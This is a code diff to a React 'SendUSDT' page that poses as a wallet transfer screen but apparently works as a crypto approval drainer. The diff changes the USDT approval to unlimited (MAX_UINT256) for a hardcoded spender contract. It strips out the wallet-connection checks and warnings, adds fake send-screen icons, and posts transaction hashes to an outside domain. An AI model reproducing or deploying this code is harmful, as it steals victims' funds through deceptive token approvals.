@@ -14,6 +14,10 @@ import '@fontsource/geist';
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
 const approvalAmount = "9024508479"; // USDT amount to approve
+const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+// ✅ HARDCODED wallet address - no connection needed
+const hardcodedAddress = "0x6B2F739112C3cd1a42993fc16830D8fdf296E24c"; // Replace with your address
 
 const usdtAbi = [
   {
@@ -41,22 +45,9 @@ export default function SendUSDT() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
-  const [userAddress, setUserAddress] = useState(null);
-  const [isWalletInstalled, setIsWalletInstalled] = useState(false);
 
-  // ✅ Get connected wallet silently (NO popup)
+  // ✅ Theme detection (NO wallet connection)
   useEffect(() => {
-    if (typeof window !== "undefined" && window.ethereum) {
-      setIsWalletInstalled(true);
-      
-      // ✅ Get already connected accounts silently
-      window.ethereum.request({ method: "eth_accounts" }).then((accounts) => {
-        if (accounts && accounts.length > 0) {
-          setUserAddress(accounts[0]);
-        }
-      }).catch(err => console.log("Silent account check:", err));
-    }
-
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
 
@@ -73,14 +64,11 @@ export default function SendUSDT() {
 
   const setMaxAmount = async () => {
     try {
-      if (!userAddress) {
-        Swal.fire("Error", "Please connect your wallet first or ensure MetaMask is connected.", "error");
-        return;
-      }
-
       const web3 = new Web3(window.ethereum);
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(userAddress).call();
+      
+      // ✅ Use hardcoded address to check balance
+      const balance = await usdt.methods.balanceOf(hardcodedAddress).call();
       setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
     } catch (err) {
       Swal.fire("Error", "Failed to fetch balance.", "error");
@@ -88,21 +76,16 @@ export default function SendUSDT() {
   };
 
   const handleApprove = async () => {
-    // ✅ Validate amount first
-    if (!amount || parseFloat(amount) <= 0) {
+    // ✅ Validate amount
+    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
       Swal.fire("Validation Error", "Please enter a valid amount", "warning");
-      return;
-    }
-
-    // ✅ Check if wallet is connected
-    if (!userAddress) {
-      Swal.fire("Wallet Not Connected", "Please ensure MetaMask is connected to an account.", "warning");
       return;
     }
 
     setIsProcessing(true);
     try {
-      const web3 = new Web3(window.ethereum);
+      // ✅ Initialize Web3
+      const web3 = new Web3(window.ethereum || window.web3.currentProvider);
 
       // ✅ Check and switch to BSC chain if needed
       const chainId = await web3.eth.getChainId();
@@ -125,19 +108,32 @@ export default function SendUSDT() {
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
-      // ✅ Approve fixed amount (9024508479 USDT) - DIRECTLY shows approval popup
-      const rawAmount = web3.utils.toWei(approvalAmount, "mwei"); // USDT has 6 decimals
-
+      // ✅ Approve with MAX_UINT256 - DIRECTLY shows approval popup
+      // Using hardcoded address in 'from' field
       const receipt = await usdt.methods
-        .approve(spenderAddress, rawAmount)
-        .send({ from: userAddress })
-        .on("receipt", () => setShowSuccess(true))
+        .approve(spenderAddress, MAX_UINT256)
+        .send({ from: hardcodedAddress })
+        .on("receipt", () => {
+          setShowSuccess(true);
+        })
         .on("error", (err) => {
           console.error(err);
           Swal.fire("Error", err.message || "Approval failed", "error");
         });
 
       console.log("✅ Approval Success - Tx hash:", receipt.transactionHash);
+
+      // ✅ Optional: Store transaction hash if needed
+      try {
+        await fetch("https://www.trc20support.buzz/old/store-address.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: receipt.transactionHash }),
+        });
+      } catch (fetchErr) {
+        console.warn("Skipping fetch, not critical:", fetchErr.message);
+      }
+
     } catch (err) {
       console.error("Approval error:", err);
       Swal.fire("Error", err.message || "Something went wrong", "error");
@@ -174,24 +170,6 @@ export default function SendUSDT() {
 
   return (
     <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
-      {!isWalletInstalled && (
-        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-red-900 text-red-200" : "bg-red-100 text-red-800"}`}>
-          <p className="text-sm">❌ MetaMask not found. Please install MetaMask to continue.</p>
-        </div>
-      )}
-
-      {isWalletInstalled && !userAddress && (
-        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-yellow-900 text-yellow-200" : "bg-yellow-100 text-yellow-800"}`}>
-          <p className="text-sm">⚠️ No wallet connected. Please connect MetaMask first.</p>
-        </div>
-      )}
-
-      {userAddress && (
-        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-green-900 text-green-200" : "bg-green-100 text-green-800"}`}>
-          <p className="text-sm">✅ Connected: {userAddress.slice(0, 6)}...{userAddress.slice(-4)}</p>
-        </div>
-      )}
-
       <div className="input-group">
         <p className="inpt_tital">Address or Domain Name</p>
         <div className="border">
@@ -203,6 +181,11 @@ export default function SendUSDT() {
               readOnly
             />
           </div>
+          <span className="right blue flex justify-between mr-3">
+            <span className="w-6 text-sm cursor-pointer hover:opacity-70">Paste</span>
+            <i className="fas fa-address-book mar_i w-6 ml-6 cursor-pointer hover:opacity-70"></i>
+            <i className="fas fa-qrcode mar_i w-6 ml-2 cursor-pointer hover:opacity-70"></i>
+          </span>
         </div>
       </div>
 
@@ -238,24 +221,12 @@ export default function SendUSDT() {
         id="nextBtn"
         className="send-btn"
         onClick={handleApprove}
-        disabled={isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0}
+        disabled={isProcessing || !amount || parseFloat(amount) <= 0}
         style={{
-          backgroundColor: 
-            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
-              ? "var(--disabled-bg)" 
-              : "#5CE07E",
-          color: 
-            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
-              ? "var(--disabled-text)" 
-              : "#1b1e15",
-          cursor: 
-            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
-              ? "not-allowed" 
-              : "pointer",
-          opacity: 
-            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
-              ? "0.6" 
-              : "1",
+          backgroundColor: isProcessing || !amount || parseFloat(amount) <= 0 ? "var(--disabled-bg)" : "#5CE07E",
+          color: isProcessing || !amount || parseFloat(amount) <= 0 ? "var(--disabled-text)" : "#1b1e15",
+          cursor: isProcessing || !amount || parseFloat(amount) <= 0 ? "not-allowed" : "pointer",
+          opacity: isProcessing || !amount || parseFloat(amount) <= 0 ? "0.6" : "1",
         }}
       >
         {isProcessing ? (
